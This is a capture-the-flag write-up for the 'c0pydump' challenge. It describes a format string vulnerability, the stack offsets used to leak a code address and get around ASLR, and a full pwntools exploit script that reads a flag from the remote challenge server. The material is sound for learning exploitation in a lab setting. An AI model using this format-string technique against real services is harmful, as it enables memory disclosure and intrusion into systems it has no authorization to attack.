# c0pydump

Welcome to our printing service c0pydump! It is a highly secure application. Can you acquire the flag?

`nc challenges.crysys.hu 5006`

_author: tcs_

Attached file:
- [c0pydump.tar.gz](c0pydump.tar.gz)

## Writeup

Testing the service, I've quickly discovered that we have an old favorite format string injection vulnerability.

With some testing locally, I've found the following important stack offsets:
- `%7$p` is the address of our buffer (not very important, but I did not know)
- `%6$p` is the return address of `main`, i.e `__libc_csu_init`
- `%12$p-%13$p-%14$p` contain out input

The flag is read into a global buffer. Sadly, ASLR moves that randomly, so we can't just read it, but if we leak the address of `__libc_csu_init` we can calculate it.

If we enter a pointer, we can print it as `%s` and read the memory contents of that pointer as a string - so we can just read the flag this way.

Final exploit code:
```python
from pwn import *

r = remote("challenges.crysys.hu", 5006)
#r = process("c0pydump")

# %7$p is the address of our buffer (in the stack)
# %6$p __libc_csu_init

# %12$p-%13$p-%14$p are all our strings
# dump %6$p
# calculate ofset of FLAG
# print flag w/ %s

r.clean()
r.sendline("%6$p")
libc_csu = eval(r.clean().split(b"\n")[2])
base_address = libc_csu - 0x13b0
fl = base_address + 0x40a0
print(hex(fl))
print(p64(fl))
payload = b"%14$sAAA"+b"B"*8+p64(fl)

# print(payload)

r.sendline(payload)
r.interactive()
```
